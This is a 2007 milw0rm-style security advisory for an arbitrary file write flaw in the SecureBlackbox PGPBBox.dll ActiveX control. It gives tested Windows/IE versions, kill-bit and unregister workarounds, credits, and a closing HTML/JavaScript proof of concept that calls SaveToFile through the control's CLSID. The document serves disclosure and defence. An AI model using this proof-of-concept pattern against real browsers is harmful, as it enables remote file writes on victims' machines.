@@ -1,0 +1,77 @@
+:. GOODFELLAS Security Research TEAM  .:
+:. http://goodfellas.shellcode.com.ar .:
+
+PGPBBox.dll 5.1.0.112 SecureBlackbox Arbitary Data Write Exploit.
+================================================================
+
+Test in patched XP SP2 IE 6.0/7.0 and Vista IE 7.0
+==================================================
+
+Internal ID: VULWAR200707121.
+
+Introduction
+------------
+PGPBBox.dll is a library included in the SecureBlackbox
+software package from the Eldos Company http://www.eldos.com/
+
+Tested In
+---------
+- Windows XP SP2 english/french with IE 6.0 / 7.0.
+- Windows vista Professional English/French SP1 with IE 7.0
+
+Summary
+-------
+The SaveToFile method doesn't check if it's is being called from the application, 
+or malicious users. Remote Attacker could craft a html page and write arbitrary
+data.
+
+Impact
+------
+Any computer that uses this Sofware will be exposed to Data Write Arbitrary.
+
+Workaround
+----------
+- Activate the Kill bit zero in clsid: C22BB435-9B7F-4B1F-ACBD-CD36D34D6DFF.
+- Unregister PGPBBox.dll using regsvr32.
+
+
+Timeline
+--------
+July 12, 2007 -- Bug discovery.
+July 12, 2007 -- Bug published.
+
+
+Credits
+-------
+ * callAX <callax@shellcode.com.ar
+ * GoodFellas Security Research Team <goodfellas.shellcode.com.ar>
+
+
+
+Technical Details
+-----------------
+
+SaveToFile method receives one argument filename in this format "c:\path\file".
+
+
+Proof of Concept
+----------------
+
+<HTML>
+<BODY>
+  <object id=ctrl classid="clsid:{C22BB435-9B7F-4B1F-ACBD-CD36D34D6DFF}"></object>
+                           
+<SCRIPT>
+
+function Poc()
+ {
+    arg2="c:\\arbitrary_file.txt"
+    ctrl.SaveToFile(arg2)
+ }
+
+</SCRIPT>
+<input language=JavaScript onclick=Poc() type=button value="Proof of Concept">
+</BODY>
+</HTML>
+
+# milw0rm.com [2007-07-12]
